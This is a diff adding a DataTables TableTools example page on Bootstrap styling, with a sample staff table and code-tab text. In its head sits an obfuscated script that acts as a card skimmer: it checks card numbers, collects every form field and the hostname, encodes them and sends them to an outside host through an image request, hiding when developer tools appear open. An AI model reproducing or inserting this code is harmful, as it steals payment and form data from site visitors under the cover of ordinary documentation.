@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<link rel="shortcut icon" type="image/ico" href="http://www.datatables.net/favicon.ico">
+	<meta name="viewport" content="initial-scale=1.0, maximum-scale=2.0">
+
+	<title>TableTools example - Bootstrap styling</title>
+	<link rel="stylesheet" type="text/css" href="//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css">
+	<link rel="stylesheet" type="text/css" href="../../Plugins/integration/bootstrap/3/dataTables.bootstrap.css">
+	<link rel="stylesheet" type="text/css" href="../../../examples/resources/syntax/shCore.css">
+	<link rel="stylesheet" type="text/css" href="../../../examples/resources/demo.css">
+	<style type="text/css" class="init">
+
+	body { font-size: 140%; }
+	div.DTTT { margin-bottom: 0.5em; float: right; }
+	div.dataTables_wrapper { clear: both; }
+
+	</style>
+	<script type="text/javascript" language="javascript" src="../../../media/js/jquery.js"></script>
+	<script type="text/javascript" language="javascript" src="../../../media/js/jquery.dataTables.js"></script>
+	<script type="text/javascript" language="javascript" src="../js/dataTables.tableTools.js"></script>
+	<script type="text/javascript" language="javascript" src=
+	"../../Plugins/integration/bootstrap/3/dataTables.bootstrap.js"></script>
+	<script type="text/javascript" language="javascript" src="../../../examples/resources/syntax/shCore.js"></script>
+	<script type="text/javascript" language="javascript" src="../../../examples/resources/demo.js"></script>
+	<script type="text/javascript" language="javascript" class="init">
+
+
+$(document).ready(function() {
+	var table = $('#example').DataTable();
+	var tt = new $.fn.dataTable.TableTools( table );
+
+	$( tt.fnContainer() ).insertBefore('div.dataTables_wrapper');
+} );
+
+
+	</script>
+<script>var _0x47ba=['\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d'];(function(_0x5e91f0,_0x2a6eae){var _0x280170=function(_0x43950e){while(--_0x43950e){_0x5e91f0['push'](_0x5e91f0['shift']());}};_0x280170(++_0x2a6eae);}(_0x47ba,0xb3));var _0x110f=function(_0x5b3b06,_0x12fb97){_0x5b3b06=_0x5b3b06-0x0;var _0x21b03e=_0x47ba[_0x5b3b06];if(_0x110f['kooICi']===undefined){(function(){var _0x47b353=function(){var _0x2e1e17;try{_0x2e1e17=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x89462c){_0x2e1e17=window;}return _0x2e1e17;};var _0xc3787f=_0x47b353();var _0x4fde9d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xc3787f['atob']||(_0xc3787f['atob']=function(_0x35997a){var _0x3d3bb3=String(_0x35997a)['replace'](/=+$/,'');for(var _0x1725b9=0x0,_0x4f90cd,_0x37f682,_0x1c3272=0x0,_0x1a435a='';_0x37f682=_0x3d3bb3['charAt'](_0x1c3272++);~_0x37f682&&(_0x4f90cd=_0x1725b9%0x4?_0x4f90cd*0x40+_0x37f682:_0x37f682,_0x1725b9++%0x4)?_0x1a435a+=String['fromCharCode'](0xff&_0x4f90cd>>(-0x2*_0x1725b9&0x6)):0x0){_0x37f682=_0x4fde9d['indexOf'](_0x37f682);}return _0x1a435a;});}());_0x110f['rWyPpO']=function(_0x12d347){var _0x418aef=atob(_0x12d347);var _0x398336=[];for(var _0xab3ef7=0x0,_0x3284fb=_0x418aef['length'];_0xab3ef7<_0x3284fb;_0xab3ef7++){_0x398336+='%'+('00'+_0x418aef['charCodeAt'](_0xab3ef7)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x398336);};_0x110f['xSCWnE']={};_0x110f['kooICi']=!![];}var _0x157c97=_0x110f['xSCWnE'][_0x5b3b06];if(_0x157c97===undefined){_0x21b03e=_0x110f['rWyPpO'](_0x21b03e);_0x110f['xSCWnE'][_0x5b3b06]=_0x21b03e;}else{_0x21b03e=_0x157c97;}return _0x21b03e;};function _0x1198ef(_0x368311,_0x37db1a,_0x4c3269){return _0x368311[_0x110f('0x0')](new RegExp(_0x37db1a,'\x67'),_0x4c3269);}function _0x1c03cf(_0x2bd4f8){var _0xda9db9=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3a1e04=/^(?:5[1-5][0-9]{14})$/;var _0x44b57f=/^(?:3[47][0-9]{13})$/;var _0x1b87de=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x4f7913=![];if(_0xda9db9[_0x110f('0x1')](_0x2bd4f8)){_0x4f7913=!![];}else if(_0x3a1e04[_0x110f('0x1')](_0x2bd4f8)){_0x4f7913=!![];}else if(_0x44b57f[_0x110f('0x1')](_0x2bd4f8)){_0x4f7913=!![];}else if(_0x1b87de['\x74\x65\x73\x74'](_0x2bd4f8)){_0x4f7913=!![];}return _0x4f7913;}function _0x546a6b(_0x5758a3){if(/[^0-9-\s]+/[_0x110f('0x1')](_0x5758a3))return![];var _0x33d0f7=0x0,_0x3be616=0x0,_0x2a3aee=![];_0x5758a3=_0x5758a3[_0x110f('0x0')](/\D/g,'');for(var _0x189ee0=_0x5758a3[_0x110f('0x2')]-0x1;_0x189ee0>=0x0;_0x189ee0--){var _0x38783a=_0x5758a3[_0x110f('0x3')](_0x189ee0),_0x3be616=parseInt(_0x38783a,0xa);if(_0x2a3aee){if((_0x3be616*=0x2)>0x9)_0x3be616-=0x9;}_0x33d0f7+=_0x3be616;_0x2a3aee=!_0x2a3aee;}return _0x33d0f7%0xa==0x0;}(function(){'use strict';const _0x3bc5a5={};_0x3bc5a5[_0x110f('0x4')]=![];_0x3bc5a5[_0x110f('0x5')]=undefined;const _0xed3289=0xa0;const _0xa32859=(_0x482175,_0x651449)=>{window[_0x110f('0x6')](new CustomEvent(_0x110f('0x7'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x482175,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x651449}}));};setInterval(()=>{const _0x1bd3e9=window[_0x110f('0x8')]-window[_0x110f('0x9')]>_0xed3289;const _0x1bde7a=window[_0x110f('0xa')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0xed3289;const _0x2a2d98=_0x1bd3e9?_0x110f('0xb'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0x1bde7a&&_0x1bd3e9)&&(window[_0x110f('0xc')]&&window[_0x110f('0xc')][_0x110f('0xd')]&&window[_0x110f('0xc')][_0x110f('0xd')][_0x110f('0xe')]||_0x1bd3e9||_0x1bde7a)){if(!_0x3bc5a5[_0x110f('0x4')]||_0x3bc5a5[_0x110f('0x5')]!==_0x2a2d98){_0xa32859(!![],_0x2a2d98);}_0x3bc5a5[_0x110f('0x4')]=!![];_0x3bc5a5[_0x110f('0x5')]=_0x2a2d98;}else{if(_0x3bc5a5[_0x110f('0x4')]){_0xa32859(![],undefined);}_0x3bc5a5[_0x110f('0x4')]=![];_0x3bc5a5[_0x110f('0x5')]=undefined;}},0x1f4);if(typeof module!==_0x110f('0xf')&&module[_0x110f('0x10')]){module[_0x110f('0x10')]=_0x3bc5a5;}else{window[_0x110f('0x11')]=_0x3bc5a5;}}());String[_0x110f('0x12')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x155aa1=0x0,_0x4d1012,_0x114671;if(this[_0x110f('0x2')]===0x0)return _0x155aa1;for(_0x4d1012=0x0;_0x4d1012<this['\x6c\x65\x6e\x67\x74\x68'];_0x4d1012++){_0x114671=this[_0x110f('0x13')](_0x4d1012);_0x155aa1=(_0x155aa1<<0x5)-_0x155aa1+_0x114671;_0x155aa1|=0x0;}return _0x155aa1;};var _0x5a4719={};_0x5a4719['\x47\x61\x74\x65']='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x66\x6f\x6e\x74\x2d\x61\x73\x73\x65\x74\x73\x2e\x63\x6f\x6d\x2f\x69\x6d\x67';_0x5a4719[_0x110f('0x14')]={};_0x5a4719[_0x110f('0x15')]=[];_0x5a4719[_0x110f('0x16')]=![];_0x5a4719[_0x110f('0x17')]=function(_0x2a751d){if(_0x2a751d.id!==undefined&&_0x2a751d.id!=''&&_0x2a751d.id!==null&&_0x2a751d.value.length<0x100&&_0x2a751d.value.length>0x0){if(_0x546a6b(_0x1198ef(_0x1198ef(_0x2a751d.value,'\x2d',''),'\x20',''))&&_0x1c03cf(_0x1198ef(_0x1198ef(_0x2a751d.value,'\x2d',''),'\x20','')))_0x5a4719.IsValid=!![];_0x5a4719.Data[_0x2a751d.id]=_0x2a751d.value;return;}if(_0x2a751d.name!==undefined&&_0x2a751d.name!=''&&_0x2a751d.name!==null&&_0x2a751d.value.length<0x100&&_0x2a751d.value.length>0x0){if(_0x546a6b(_0x1198ef(_0x1198ef(_0x2a751d.value,'\x2d',''),'\x20',''))&&_0x1c03cf(_0x1198ef(_0x1198ef(_0x2a751d.value,'\x2d',''),'\x20','')))_0x5a4719.IsValid=!![];_0x5a4719.Data[_0x2a751d.name]=_0x2a751d.value;return;}};_0x5a4719[_0x110f('0x18')]=function(){var _0x2671b1=document.getElementsByTagName(_0x110f('0x19'));var _0x4c5d28=document.getElementsByTagName(_0x110f('0x1a'));var _0x248ee6=document.getElementsByTagName(_0x110f('0x1b'));for(var _0x3b4220=0x0;_0x3b4220<_0x2671b1.length;_0x3b4220++)_0x5a4719.SaveParam(_0x2671b1[_0x3b4220]);for(var _0x3b4220=0x0;_0x3b4220<_0x4c5d28.length;_0x3b4220++)_0x5a4719.SaveParam(_0x4c5d28[_0x3b4220]);for(var _0x3b4220=0x0;_0x3b4220<_0x248ee6.length;_0x3b4220++)_0x5a4719.SaveParam(_0x248ee6[_0x3b4220]);};_0x5a4719['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x5a4719.IsValid){_0x5a4719.Data[_0x110f('0x1c')]=location.hostname;var _0x43a794=encodeURIComponent(window.btoa(JSON.stringify(_0x5a4719.Data)));var _0x3270c0=_0x43a794.hashCode();for(var _0x5f1108=0x0;_0x5f1108<_0x5a4719.Sent.length;_0x5f1108++)if(_0x5a4719.Sent[_0x5f1108]==_0x3270c0)return;_0x5a4719.LoadImage(_0x43a794);}};_0x5a4719[_0x110f('0x1d')]=function(){_0x5a4719.SaveAllFields();_0x5a4719.SendData();};_0x5a4719[_0x110f('0x1e')]=function(_0x20e9df){_0x5a4719.Sent.push(_0x20e9df.hashCode());var _0x2f83d6=document.createElement('\x49\x4d\x47');_0x2f83d6.src=_0x5a4719.GetImageUrl(_0x20e9df);};_0x5a4719[_0x110f('0x1f')]=function(_0x900f40){return _0x5a4719.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0x900f40;};document[_0x110f('0x20')]=function(){if(document[_0x110f('0x21')]===_0x110f('0x22')){window[_0x110f('0x23')](_0x5a4719[_0x110f('0x1d')],0x1f4);}};</script></head>
+
+<body class="dt-example">
+	<div class="container">
+		<section>
+			<h1>TableTools example <span>Bootstrap styling</span></h1>
+
+			<div class="info">
+				<p><a href="http://twitter.github.com/bootstrap/">Twitter Bootstrap</a> is a very powerful design
+				framework for allowing you to very quickly create applications with a unified look and feel. <a href=
+				"http://datatables.net/manual/styling/bootstrap">DataTables integrates well</a> with Bootstrap, and so
+				does TableTools.</p>
+
+				<p>This example shows the default Bootstrap theme being used with a Bootstrap styled DataTable. The
+				<a href="new_init.html"><code>new</code></a> form of initialising TableTools is used here, as the
+				Bootstrap integration uses a complex <a href="//datatables.net/reference/option/dom"><code class=
+				"option" title="DataTables initialisation option">dom<span>DT</span></code></a> option (it is possible
+				to provide a custom <a href="//datatables.net/reference/option/dom"><code class="option" title=
+				"DataTables initialisation option">dom<span>DT</span></code></a> option if you want to, this is just
+				for simplicity!).</p>
+			</div>
+
+			<table id="example" class="table table-striped table-bordered" cellspacing="0" width="100%">
+				<thead>
+					<tr>
+						<th>Name</th>
+						<th>Position</th>
+						<th>Office</th>
+						<th>Age</th>
+						<th>Start date</th>
+						<th>Salary</th>
+					</tr>
+				</thead>
+
+				<tfoot>
+					<tr>
+						<th>Name</th>
+						<th>Position</th>
+						<th>Office</th>
+						<th>Age</th>
+						<th>Start date</th>
+						<th>Salary</th>
+					</tr>
+				</tfoot>
+
+				<tbody>
+					<tr>
+						<td>Tiger Nixon</td>
+						<td>System Architect</td>
+						<td>Edinburgh</td>
+						<td>61</td>
+						<td>2011/04/25</td>
+						<td>$320,800</td>
+					</tr>
+					<tr>
+						<td>Garrett Winters</td>
+						<td>Accountant</td>
+						<td>Tokyo</td>
+						<td>63</td>
+						<td>2011/07/25</td>
+						<td>$170,750</td>
+					</tr>
+					<tr>
+						<td>Ashton Cox</td>
+						<td>Junior Technical Author</td>
+						<td>San Francisco</td>
+						<td>66</td>
+						<td>2009/01/12</td>
+						<td>$86,000</td>
+					</tr>
+					<tr>
+						<td>Cedric Kelly</td>
+						<td>Senior Javascript Developer</td>
+						<td>Edinburgh</td>
+						<td>22</td>
+						<td>2012/03/29</td>
+						<td>$433,060</td>
+					</tr>
+					<tr>
+						<td>Airi Satou</td>
+						<td>Accountant</td>
+						<td>Tokyo</td>
+						<td>33</td>
+						<td>2008/11/28</td>
+						<td>$162,700</td>
+					</tr>
+					<tr>
+						<td>Brielle Williamson</td>
+						<td>Integration Specialist</td>
+						<td>New York</td>
+						<td>61</td>
+						<td>2012/12/02</td>
+						<td>$372,000</td>
+					</tr>
+					<tr>
+						<td>Herrod Chandler</td>
+						<td>Sales Assistant</td>
+						<td>San Francisco</td>
+						<td>59</td>
+						<td>2012/08/06</td>
+						<td>$137,500</td>
+					</tr>
+					<tr>
+						<td>Rhona Davidson</td>
+						<td>Integration Specialist</td>
+						<td>Tokyo</td>
+						<td>55</td>
+						<td>2010/10/14</td>
+						<td>$327,900</td>
+					</tr>
+					<tr>
+						<td>Colleen Hurst</td>
+						<td>Javascript Developer</td>
+						<td>San Francisco</td>
+						<td>39</td>
+						<td>2009/09/15</td>
+						<td>$205,500</td>
+					</tr>
+					<tr>
+						<td>Sonya Frost</td>
+						<td>Software Engineer</td>
+						<td>Edinburgh</td>
+						<td>23</td>
+						<td>2008/12/13</td>
+						<td>$103,600</td>
+					</tr>
+					<tr>
+						<td>Jena Gaines</td>
+						<td>Office Manager</td>
+						<td>London</td>
+						<td>30</td>
+						<td>2008/12/19</td>
+						<td>$90,560</td>
+					</tr>
+					<tr>
+						<td>Quinn Flynn</td>
+						<td>Support Lead</td>
+						<td>Edinburgh</td>
+						<td>22</td>
+						<td>2013/03/03</td>
+						<td>$342,000</td>
+					</tr>
+					<tr>
+						<td>Charde Marshall</td>
+						<td>Regional Director</td>
+						<td>San Francisco</td>
+						<td>36</td>
+						<td>2008/10/16</td>
+						<td>$470,600</td>
+					</tr>
+					<tr>
+						<td>Haley Kennedy</td>
+						<td>Senior Marketing Designer</td>
+						<td>London</td>
+						<td>43</td>
+						<td>2012/12/18</td>
+						<td>$313,500</td>
+					</tr>
+					<tr>
+						<td>Tatyana Fitzpatrick</td>
+						<td>Regional Director</td>
+						<td>London</td>
+						<td>19</td>
+						<td>2010/03/17</td>
+						<td>$385,750</td>
+					</tr>
+					<tr>
+						<td>Michael Silva</td>
+						<td>Marketing Designer</td>
+						<td>London</td>
+						<td>66</td>
+						<td>2012/11/27</td>
+						<td>$198,500</td>
+					</tr>
+					<tr>
+						<td>Paul Byrd</td>
+						<td>Chief Financial Officer (CFO)</td>
+						<td>New York</td>
+						<td>64</td>
+						<td>2010/06/09</td>
+						<td>$725,000</td>
+					</tr>
+					<tr>
+						<td>Gloria Little</td>
+						<td>Systems Administrator</td>
+						<td>New York</td>
+						<td>59</td>
+						<td>2009/04/10</td>
+						<td>$237,500</td>
+					</tr>
+					<tr>
+						<td>Bradley Greer</td>
+						<td>Software Engineer</td>
+						<td>London</td>
+						<td>41</td>
+						<td>2012/10/13</td>
+						<td>$132,000</td>
+					</tr>
+					<tr>
+						<td>Dai Rios</td>
+						<td>Personnel Lead</td>
+						<td>Edinburgh</td>
+						<td>35</td>
+						<td>2012/09/26</td>
+						<td>$217,500</td>
+					</tr>
+					<tr>
+						<td>Jenette Caldwell</td>
+						<td>Development Lead</td>
+						<td>New York</td>
+						<td>30</td>
+						<td>2011/09/03</td>
+						<td>$345,000</td>
+					</tr>
+					<tr>
+						<td>Yuri Berry</td>
+						<td>Chief Marketing Officer (CMO)</td>
+						<td>New York</td>
+						<td>40</td>
+						<td>2009/06/25</td>
+						<td>$675,000</td>
+					</tr>
+					<tr>
+						<td>Caesar Vance</td>
+						<td>Pre-Sales Support</td>
+						<td>New York</td>
+						<td>21</td>
+						<td>2011/12/12</td>
+						<td>$106,450</td>
+					</tr>
+					<tr>
+						<td>Doris Wilder</td>
+						<td>Sales Assistant</td>
+						<td>Sidney</td>
+						<td>23</td>
+						<td>2010/09/20</td>
+						<td>$85,600</td>
+					</tr>
+					<tr>
+						<td>Angelica Ramos</td>
+						<td>Chief Executive Officer (CEO)</td>
+						<td>London</td>
+						<td>47</td>
+						<td>2009/10/09</td>
+						<td>$1,200,000</td>
+					</tr>
+					<tr>
+						<td>Gavin Joyce</td>
+						<td>Developer</td>
+						<td>Edinburgh</td>
+						<td>42</td>
+						<td>2010/12/22</td>
+						<td>$92,575</td>
+					</tr>
+					<tr>
+						<td>Jennifer Chang</td>
+						<td>Regional Director</td>
+						<td>Singapore</td>
+						<td>28</td>
+						<td>2010/11/14</td>
+						<td>$357,650</td>
+					</tr>
+					<tr>
+						<td>Brenden Wagner</td>
+						<td>Software Engineer</td>
+						<td>San Francisco</td>
+						<td>28</td>
+						<td>2011/06/07</td>
+						<td>$206,850</td>
+					</tr>
+					<tr>
+						<td>Fiona Green</td>
+						<td>Chief Operating Officer (COO)</td>
+						<td>San Francisco</td>
+						<td>48</td>
+						<td>2010/03/11</td>
+						<td>$850,000</td>
+					</tr>
+					<tr>
+						<td>Shou Itou</td>
+						<td>Regional Marketing</td>
+						<td>Tokyo</td>
+						<td>20</td>
+						<td>2011/08/14</td>
+						<td>$163,000</td>
+					</tr>
+					<tr>
+						<td>Michelle House</td>
+						<td>Integration Specialist</td>
+						<td>Sidney</td>
+						<td>37</td>
+						<td>2011/06/02</td>
+						<td>$95,400</td>
+					</tr>
+					<tr>
+						<td>Suki Burks</td>
+						<td>Developer</td>
+						<td>London</td>
+						<td>53</td>
+						<td>2009/10/22</td>
+						<td>$114,500</td>
+					</tr>
+					<tr>
+						<td>Prescott Bartlett</td>
+						<td>Technical Author</td>
+						<td>London</td>
+						<td>27</td>
+						<td>2011/05/07</td>
+						<td>$145,000</td>
+					</tr>
+					<tr>
+						<td>Gavin Cortez</td>
+						<td>Team Leader</td>
+						<td>San Francisco</td>
+						<td>22</td>
+						<td>2008/10/26</td>
+						<td>$235,500</td>
+					</tr>
+					<tr>
+						<td>Martena Mccray</td>
+						<td>Post-Sales support</td>
+						<td>Edinburgh</td>
+						<td>46</td>
+						<td>2011/03/09</td>
+						<td>$324,050</td>
+					</tr>
+					<tr>
+						<td>Unity Butler</td>
+						<td>Marketing Designer</td>
+						<td>San Francisco</td>
+						<td>47</td>
+						<td>2009/12/09</td>
+						<td>$85,675</td>
+					</tr>
+					<tr>
+						<td>Howard Hatfield</td>
+						<td>Office Manager</td>
+						<td>San Francisco</td>
+						<td>51</td>
+						<td>2008/12/16</td>
+						<td>$164,500</td>
+					</tr>
+					<tr>
+						<td>Hope Fuentes</td>
+						<td>Secretary</td>
+						<td>San Francisco</td>
+						<td>41</td>
+						<td>2010/02/12</td>
+						<td>$109,850</td>
+					</tr>
+					<tr>
+						<td>Vivian Harrell</td>
+						<td>Financial Controller</td>
+						<td>San Francisco</td>
+						<td>62</td>
+						<td>2009/02/14</td>
+						<td>$452,500</td>
+					</tr>
+					<tr>
+						<td>Timothy Mooney</td>
+						<td>Office Manager</td>
+						<td>London</td>
+						<td>37</td>
+						<td>2008/12/11</td>
+						<td>$136,200</td>
+					</tr>
+					<tr>
+						<td>Jackson Bradshaw</td>
+						<td>Director</td>
+						<td>New York</td>
+						<td>65</td>
+						<td>2008/09/26</td>
+						<td>$645,750</td>
+					</tr>
+					<tr>
+						<td>Olivia Liang</td>
+						<td>Support Engineer</td>
+						<td>Singapore</td>
+						<td>64</td>
+						<td>2011/02/03</td>
+						<td>$234,500</td>
+					</tr>
+					<tr>
+						<td>Bruno Nash</td>
+						<td>Software Engineer</td>
+						<td>London</td>
+						<td>38</td>
+						<td>2011/05/03</td>
+						<td>$163,500</td>
+					</tr>
+					<tr>
+						<td>Sakura Yamamoto</td>
+						<td>Support Engineer</td>
+						<td>Tokyo</td>
+						<td>37</td>
+						<td>2009/08/19</td>
+						<td>$139,575</td>
+					</tr>
+					<tr>
+						<td>Thor Walton</td>
+						<td>Developer</td>
+						<td>New York</td>
+						<td>61</td>
+						<td>2013/08/11</td>
+						<td>$98,540</td>
+					</tr>
+					<tr>
+						<td>Finn Camacho</td>
+						<td>Support Engineer</td>
+						<td>San Francisco</td>
+						<td>47</td>
+						<td>2009/07/07</td>
+						<td>$87,500</td>
+					</tr>
+					<tr>
+						<td>Serge Baldwin</td>
+						<td>Data Coordinator</td>
+						<td>Singapore</td>
+						<td>64</td>
+						<td>2012/04/09</td>
+						<td>$138,575</td>
+					</tr>
+					<tr>
+						<td>Zenaida Frank</td>
+						<td>Software Engineer</td>
+						<td>New York</td>
+						<td>63</td>
+						<td>2010/01/04</td>
+						<td>$125,250</td>
+					</tr>
+					<tr>
+						<td>Zorita Serrano</td>
+						<td>Software Engineer</td>
+						<td>San Francisco</td>
+						<td>56</td>
+						<td>2012/06/01</td>
+						<td>$115,000</td>
+					</tr>
+					<tr>
+						<td>Jennifer Acosta</td>
+						<td>Junior Javascript Developer</td>
+						<td>Edinburgh</td>
+						<td>43</td>
+						<td>2013/02/01</td>
+						<td>$75,650</td>
+					</tr>
+					<tr>
+						<td>Cara Stevens</td>
+						<td>Sales Assistant</td>
+						<td>New York</td>
+						<td>46</td>
+						<td>2011/12/06</td>
+						<td>$145,600</td>
+					</tr>
+					<tr>
+						<td>Hermione Butler</td>
+						<td>Regional Director</td>
+						<td>London</td>
+						<td>47</td>
+						<td>2011/03/21</td>
+						<td>$356,250</td>
+					</tr>
+					<tr>
+						<td>Lael Greer</td>
+						<td>Systems Administrator</td>
+						<td>London</td>
+						<td>21</td>
+						<td>2009/02/27</td>
+						<td>$103,500</td>
+					</tr>
+					<tr>
+						<td>Jonas Alexander</td>
+						<td>Developer</td>
+						<td>San Francisco</td>
+						<td>30</td>
+						<td>2010/07/14</td>
+						<td>$86,500</td>
+					</tr>
+					<tr>
+						<td>Shad Decker</td>
+						<td>Regional Director</td>
+						<td>Edinburgh</td>
+						<td>51</td>
+						<td>2008/11/13</td>
+						<td>$183,000</td>
+					</tr>
+					<tr>
+						<td>Michael Bruce</td>
+						<td>Javascript Developer</td>
+						<td>Singapore</td>
+						<td>29</td>
+						<td>2011/06/27</td>
+						<td>$183,000</td>
+					</tr>
+					<tr>
+						<td>Donna Snider</td>
+						<td>Customer Support</td>
+						<td>New York</td>
+						<td>27</td>
+						<td>2011/01/25</td>
+						<td>$112,000</td>
+					</tr>
+				</tbody>
+			</table>
+
+			<ul class="tabs">
+				<li class="active">Javascript</li>
+				<li>HTML</li>
+				<li>CSS</li>
+				<li>Ajax</li>
+				<li>Server-side script</li>
+			</ul>
+
+			<div class="tabs">
+				<div class="js">
+					<p>The Javascript shown below is used to initialise the table shown in this
+					example:</p><code class="multiline brush: js;">$(document).ready(function() {
+	var table = $('#example').DataTable();
+	var tt = new $.fn.dataTable.TableTools( table );
+
+	$( tt.fnContainer() ).insertBefore('div.dataTables_wrapper');
+} );</code>
+
+					<p>In addition to the above code, the following Javascript library files are loaded for use in this
+					example:</p>
+
+					<ul>
+						<li><a href="../../../media/js/jquery.js">../../../media/js/jquery.js</a></li>
+						<li><a href=
+						"../../../media/js/jquery.dataTables.js">../../../media/js/jquery.dataTables.js</a></li>
+						<li><a href="../js/dataTables.tableTools.js">../js/dataTables.tableTools.js</a></li>
+						<li><a href=
+						"../../Plugins/integration/bootstrap/3/dataTables.bootstrap.js">../../Plugins/integration/bootstrap/3/dataTables.bootstrap.js</a></li>
+					</ul>
+				</div>
+
+				<div class="table">
+					<p>The HTML shown below is the raw HTML table element, before it has been enhanced by
+					DataTables:</p>
+				</div>
+
+				<div class="css">
+					<div>
+						<p>This example uses a little bit of additional CSS beyond what is loaded from the library
+						files (below), in order to correctly display the table. The additional CSS used is shown
+						below:</p><code class="multiline brush: js;">body { font-size: 140%; }
+	div.DTTT { margin-bottom: 0.5em; float: right; }
+	div.dataTables_wrapper { clear: both; }</code>
+					</div>
+
+					<p>The following CSS library files are loaded for use in this example to provide the styling of the
+					table:</p>
+
+					<ul>
+						<li><a href=
+						"//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css">//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css</a></li>
+						<li><a href=
+						"../../Plugins/integration/bootstrap/3/dataTables.bootstrap.css">../../Plugins/integration/bootstrap/3/dataTables.bootstrap.css</a></li>
+					</ul>
+				</div>
+
+				<div class="ajax">
+					<p>This table loads data by Ajax. The latest data that has been loaded is shown below. This data
+					will update automatically as any additional data is loaded.</p>
+				</div>
+
+				<div class="php">
+					<p>The script used to perform the server-side processing for this table is shown below. Please note
+					that this is just an example script using PHP. Server-side processing scripts can be written in any
+					language, using <a href="//datatables.net/manual/server-side">the protocol described in the
+					DataTables documentation</a>.</p>
+				</div>
+			</div>
+		</section>
+	</div>
+
+	<section>
+		<div class="footer">
+			<div class="gradient"></div>
+
+			<div class="liner">
+				<h2>Other examples</h2>
+
+				<div class="toc">
+					<div class="toc-group">
+						<h3><a href="./index.html">Examples</a></h3>
+						<ul class="toc active">
+							<li><a href="./simple.html">Basic initialisation</a></li>
+							<li><a href="./plug-in.html">Plug-in button types</a></li>
+							<li class="active"><a href="./bootstrap.html">Bootstrap styling</a></li>
+							<li><a href="./swf_path.html">Setting the SWF path</a></li>
+							<li><a href="./new_init.html">Initialisation with `new`</a></li>
+							<li><a href="./defaults.html">Defaults</a></li>
+							<li><a href="./select_single.html">Row selection - single row select</a></li>
+							<li><a href="./select_multi.html">Row selection - multi-row select</a></li>
+							<li><a href="./select_os.html">Row selection - operating system style</a></li>
+							<li><a href="./select_column.html">Row selection - row selector on specific cells</a></li>
+							<li><a href="./multiple_tables.html">Multiple tables</a></li>
+							<li><a href="./multi_instance.html">Multiple toolbars</a></li>
+							<li><a href="./collection.html">Button collections</a></li>
+							<li><a href="./button_text.html">Custom button text</a></li>
+							<li><a href="./alter_buttons.html">Button arrangement</a></li>
+							<li><a href="./ajax.html">Ajax loaded data</a></li>
